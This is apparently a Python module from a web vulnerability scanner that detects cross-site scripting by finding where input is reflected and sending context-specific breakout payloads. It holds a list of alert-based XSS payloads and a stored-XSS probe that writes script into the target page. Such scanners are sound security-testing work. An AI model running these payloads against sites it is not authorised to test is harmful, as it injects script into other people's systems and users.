"""
Cross-Site Scripting (XSS) detection engine.

Context-aware detection:
1. Inject a unique marker and observe where/how it's reflected
2. Analyze the reflection context (HTML body, attribute, JS string, etc.)
3. Generate context-specific breakout payloads
4. Verify execution via marker presence in executable context
5. Check for stored XSS by revisiting the page

Payloads are built for the exact reflection context, not sprayed from a wordlist.
"""
from __future__ import annotations

import re
import secrets
from typing import Optional

import structlog

from nightfall.core.http import Evidence

logger = structlog.get_logger(__name__)


# ── Reflection Context Detection ────────────────────────────────────────────

class ReflectionContext:
    """Identifies the context where user input is reflected."""

    HTML_BODY = "html-body"
    HTML_ATTR_DQ = "html-attr-dq"       # inside double-quoted attribute
    HTML_ATTR_SQ = "html-attr-sq"       # inside single-quoted attribute
    HTML_ATTR_UQ = "html-attr-uq"       # inside unquoted attribute
    JS_STRING_DQ = "js-string-dq"       # inside JS double-quoted string
    JS_STRING_SQ = "js-string-sq"       # inside JS single-quoted string
    JS_TEMPLATE = "js-template"         # inside JS template literal
    HTML_COMMENT = "html-comment"       # inside <!-- comment -->
    URL_ATTR = "url-attribute"          # inside href/src/action
    CSS_CONTEXT = "css-context"         # inside <style> or style=""
    NONE = "none"

    @staticmethod
    def detect(body: str, marker: str) -> str:
        """Detect the reflection context of a marker in the response body."""
        if marker not in body:
            return ReflectionContext.NONE

        pos = body.find(marker)
        before = body[max(0, pos - 200):pos]
        after = body[pos + len(marker):pos + len(marker) + 200]

        # Check JS string contexts
        in_script = bool(re.search(r"<script[^>]*>[^<]*$", before, re.I | re.S))
        if in_script:
            # Count quotes to determine string type
            dq_count = before[before.rfind("<script"):].count('"') % 2
            sq_count = before[before.rfind("<script"):].count("'") % 2
            bt_count = before[before.rfind("<script"):].count('`') % 2
            if dq_count == 1:
                return ReflectionContext.JS_STRING_DQ
            if sq_count == 1:
                return ReflectionContext.JS_STRING_SQ
            if bt_count == 1:
                return ReflectionContext.JS_TEMPLATE
            return ReflectionContext.HTML_BODY  # JS context but not in string

        # Check HTML comment
        if "<!--" in before and "-->" not in before[before.rfind("<!--"):]:
            return ReflectionContext.HTML_COMMENT

        # Check CSS context
        if re.search(r"<style[^>]*>[^<]*$", before, re.I | re.S):
            return ReflectionContext.CSS_CONTEXT
        if re.search(r'style\s*=\s*["\'][^"\']*$', before, re.I):
            return ReflectionContext.CSS_CONTEXT

        # Check HTML attribute contexts
        attr_match = re.search(r'(\w+)\s*=\s*"[^"]*$', before)
        if attr_match:
            attr_name = attr_match.group(1).lower()
            if attr_name in ("href", "src", "action", "formaction", "data", "poster"):
                return ReflectionContext.URL_ATTR
            return ReflectionContext.HTML_ATTR_DQ

        attr_match = re.search(r"(\w+)\s*=\s*'[^']*$", before)
        if attr_match:
            attr_name = attr_match.group(1).lower()
            if attr_name in ("href", "src", "action"):
                return ReflectionContext.URL_ATTR
            return ReflectionContext.HTML_ATTR_SQ

        attr_match = re.search(r"(\w+)\s*=\s*[^\s\"'>]*$", before)
        if attr_match:
            return ReflectionContext.HTML_ATTR_UQ

        return ReflectionContext.HTML_BODY


# ── Context-Specific Payloads ───────────────────────────────────────────────

CONTEXT_PAYLOADS: dict[str, list[str]] = {
    ReflectionContext.HTML_BODY: [
        '<script>alert("{marker}")</script>',
        '<img src=x onerror=alert("{marker}")>',
        '<svg onload=alert("{marker}")>',
        '<body onload=alert("{marker}")>',
        '<details open ontoggle=alert("{marker}")>',
        '<marquee onstart=alert("{marker}")>',
    ],
    ReflectionContext.HTML_ATTR_DQ: [
        '" onmouseover="alert(\'{marker}\')" x="',
        '" onfocus="alert(\'{marker}\')" autofocus="',
        '"><script>alert("{marker}")</script><x x="',
        '" onload="alert(\'{marker}\')" x="',
    ],
    ReflectionContext.HTML_ATTR_SQ: [
        "' onmouseover='alert(\"{marker}\")' x='",
        "' onfocus='alert(\"{marker}\")' autofocus='",
        "'><script>alert('{marker}')</script><x x='",
    ],
    ReflectionContext.HTML_ATTR_UQ: [
        " onmouseover=alert('{marker}') ",
        " onfocus=alert('{marker}') autofocus ",
        "><script>alert('{marker}')</script><x ",
    ],
    ReflectionContext.JS_STRING_DQ: [
        '";alert("{marker}");//',
        '"-alert("{marker}")-"',
        '";</script><script>alert("{marker}")</script><script>"',
    ],
    ReflectionContext.JS_STRING_SQ: [
        "';alert('{marker}');//",
        "'-alert('{marker}')-'",
        "';</script><script>alert('{marker}')</script><script>'",
    ],
    ReflectionContext.JS_TEMPLATE: [
        "${{alert('{marker}')}}",
        "`-alert('{marker}')-`",
    ],
    ReflectionContext.URL_ATTR: [
        "javascript:alert('{marker}')",
        "javascript:alert('{marker}')//",
        "data:text/html,<script>alert('{marker}')</script>",
    ],
    ReflectionContext.HTML_COMMENT: [
        "--><script>alert('{marker}')</script><!--",
        "--><img src=x onerror=alert('{marker}')><!--",
    ],
    ReflectionContext.CSS_CONTEXT: [
        "expression(alert('{marker}'))",
        "</style><script>alert('{marker}')</script>",
    ],
}

# DOM XSS source/sink patterns
DOM_SOURCES = re.compile(
    r"(document\.(URL|documentURI|referrer|location|cookie|domain)|"
    r"location\.(href|search|hash|pathname)|"
    r"window\.(name|location)|"
    r"history\.pushState|"
    r"localStorage|sessionStorage)",
    re.I,
)

DOM_SINKS = re.compile(
    r"(\.innerHTML|\.outerHTML|\.insertAdjacentHTML|"
    r"document\.write|document\.writeln|"
    r"eval\(|setTimeout\(|setInterval\(|"
    r"Function\(|\.src\s*=|\.href\s*=|"
    r"\.action\s*=|jQuery\.html\(|"
    r"\$\([^)]*\)\.html\()",
    re.I,
)


async def xss_engine(ctx, step: dict, obj) -> Optional[Evidence]:
    """Full XSS detection pipeline.

    1. Inject a unique marker to find reflection points
    2. Determine the reflection context
    3. Send context-specific breakout payloads
    4. Verify if the payload appears in an executable context
    5. Check for DOM XSS patterns in JS
    """
    url = step.get("endpoint", "")
    params = dict(step.get("params", {}))
    method = step.get("method", "GET")

    if not params:
        params = {"q": "test"}

    target_param = list(params.keys())[0]

    # ── Phase 1: Marker injection ────────────────────────────────────────
    marker = f"NF{secrets.token_hex(4)}"
    marker_params = {**params, target_param: marker}
    marker_ev = await ctx.pool.send(method, url, params=marker_params)

    if marker not in marker_ev.response_body:
        # No reflection — check for DOM XSS patterns
        dom_result = _check_dom_xss(marker_ev.response_body, url, target_param)
        if dom_result:
            return dom_result
        logger.debug("xss_no_reflection", url=url, param=target_param)
        return None

    # ── Phase 2: Context detection ───────────────────────────────────────
    context = ReflectionContext.detect(marker_ev.response_body, marker)
    logger.info("xss_reflection_found", url=url, param=target_param, context=context)

    if context == ReflectionContext.NONE:
        return None

    # ── Phase 3: Context-specific payloads ───────────────────────────────
    payloads = CONTEXT_PAYLOADS.get(context, CONTEXT_PAYLOADS[ReflectionContext.HTML_BODY])

    for payload_template in payloads:
        confirm_marker = f"NF{secrets.token_hex(3)}"
        payload = payload_template.replace("{marker}", confirm_marker)
        test_params = {**params, target_param: payload}

        ev = await ctx.pool.send(method, url, params=test_params)

        # ── Phase 4: Verify execution context ────────────────────────────
        if confirm_marker in ev.response_body:
            # Check if our payload is intact and in an executable context
            body = ev.response_body
            payload_pos = body.find(confirm_marker)
            surrounding = body[max(0, payload_pos - 300):payload_pos + len(confirm_marker) + 300]

            # Verify the payload structure is preserved (not entity-encoded)
            if _is_executable_context(surrounding, payload, confirm_marker, context):
                ev.vuln_class = "xss"
                ev.subtype = "reflected"
                ev.param = target_param
                ev.payload = payload
                ev.marker = confirm_marker
                ev.confidence = 0.85
                ev.severity = "high"
                ev.extra = {"context": context}
                ev.evidence_snip = surrounding[:500]
                logger.info(
                    "xss_confirmed",
                    url=url,
                    param=target_param,
                    context=context,
                    payload=payload[:100],
                )
                return ev

    # ── Phase 5: Check for stored XSS ────────────────────────────────────
    # Send a payload, then revisit the page to see if it persists
    stored_marker = f"NFSTORED{secrets.token_hex(3)}"
    stored_payload = f'<img src=x onerror=alert("{stored_marker}")>'
    stored_params = {**params, target_param: stored_payload}
    await ctx.pool.send(method, url, params=stored_params)

    # Revisit without the payload
    revisit_ev = await ctx.pool.send("GET", url)
    if stored_marker in revisit_ev.response_body:
        revisit_ev.vuln_class = "xss"
        revisit_ev.subtype = "stored"
        revisit_ev.param = target_param
        revisit_ev.payload = stored_payload
        revisit_ev.marker = stored_marker
        revisit_ev.confidence = 0.9
        revisit_ev.severity = "critical"
        revisit_ev.evidence_snip = revisit_ev.response_body[:500]
        logger.info("xss_stored_detected", url=url, param=target_param)
        return revisit_ev

    logger.debug("xss_no_execution_context", url=url, param=target_param)
    return None


def _is_executable_context(surrounding: str, payload: str, marker: str, context: str) -> bool:
    """Check if the reflected payload is in an executable HTML/JS context."""
    # Check for script tags around our marker
    if re.search(r"<script[^>]*>[^<]*" + re.escape(marker), surrounding, re.I | re.S):
        return True
    # Check for event handlers
    if re.search(r'on\w+\s*=\s*["\'][^"\']*' + re.escape(marker), surrounding, re.I):
        return True
    # Check for intact payload elements
    if "<script>" in surrounding.lower() and marker in surrounding:
        return True
    if re.search(r'onerror\s*=\s*alert\(["\']?' + re.escape(marker), surrounding, re.I):
        return True
    if "javascript:" in surrounding.lower() and marker in surrounding:
        return True
    # If we're in an attribute context and the breakout worked
    if context.startswith("html-attr") and re.search(r'on\w+=', surrounding, re.I):
        return True
    return False


def _check_dom_xss(body: str, url: str, param: str) -> Optional[Evidence]:
    """Check for DOM XSS patterns (source → sink flows) in JavaScript."""
    sources_found = DOM_SOURCES.findall(body)
    sinks_found = DOM_SINKS.findall(body)

    if sources_found and sinks_found:
        ev = Evidence(
            url=url,
            method="GET",
            response_body=body[:2000],
            vuln_class="xss",
            subtype="dom",
            param=param,
            confidence=0.5,  # lower confidence — needs manual review
            severity="medium",
            evidence_snip=f"Sources: {sources_found[:5]}, Sinks: {sinks_found[:5]}",
            extra={"sources": sources_found[:10], "sinks": sinks_found[:10]},
        )
        logger.info("xss_dom_pattern", url=url, sources=len(sources_found), sinks=len(sinks_found))
        return ev

    return None
